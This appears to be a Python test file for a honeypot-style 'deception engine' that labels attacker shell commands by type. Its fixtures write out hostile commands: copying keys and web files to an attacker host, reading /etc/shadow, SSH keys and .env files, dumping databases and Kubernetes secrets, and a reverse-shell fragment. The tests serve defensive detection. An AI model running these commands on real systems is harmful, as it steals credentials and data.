"""Tests for the deception engine — verifies detection and caching."""
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent))

from deception_engine import _detect_exfil_type, get_exfil_log, _exfil_cache


def test_db_dump_detected():
    assert _detect_exfil_type("mysqldump -u root -p production > /tmp/dump.sql") == "db_dump"
    assert _detect_exfil_type("pg_dump mydb > backup.sql") == "db_dump"


def test_archive_detected():
    assert _detect_exfil_type("tar czf /tmp/backup.tar.gz /opt/app/") == "archive"
    assert _detect_exfil_type("zip -r secrets.zip /home/admin/.ssh/") == "archive"


def test_file_transfer_detected():
    assert _detect_exfil_type("scp /opt/backup/keys.tar.gz user@1.2.3.4:/tmp/") == "file_transfer"
    assert _detect_exfil_type("rsync -av /var/www/ attacker@1.2.3.4:/dump/") == "file_transfer"


def test_credential_read_detected():
    assert _detect_exfil_type("cat /home/admin/.ssh/id_rsa") == "credential_read"
    assert _detect_exfil_type("cat /etc/shadow") == "credential_read"
    assert _detect_exfil_type("cat .env") == "credential_read"


def test_file_discovery_detected():
    assert _detect_exfil_type("find / -name '*.pem' 2>/dev/null") == "file_discovery"
    assert _detect_exfil_type("find /home -name '.env'") == "file_discovery"


def test_cloud_cli_detected():
    assert _detect_exfil_type("aws s3 ls") == "cloud_cli"
    assert _detect_exfil_type("kubectl get secrets") == "cloud_cli"
    assert _detect_exfil_type("gcloud compute instances list") == "cloud_cli"


def test_history_detected():
    assert _detect_exfil_type("history") == "history_read"
    assert _detect_exfil_type("cat ~/.bash_history") == "history_read"


def test_reverse_shell_detected():
    assert _detect_exfil_type(
        "python3 -c \"import socket,subprocess,os;s=socket.socket();\""
    ) == "reverse_shell"


def test_base64_detected():
    assert _detect_exfil_type("cat /opt/app/config.json | base64") == "base64_encode"


def test_no_false_positive():
    assert _detect_exfil_type("whoami") is None
    assert _detect_exfil_type("ls -la") is None
    assert _detect_exfil_type("ps aux") is None
    assert _detect_exfil_type("cd /home/admin") is None


def test_exfil_log_empty_for_new_session():
    log = get_exfil_log("nonexistent-session")
    assert log == []
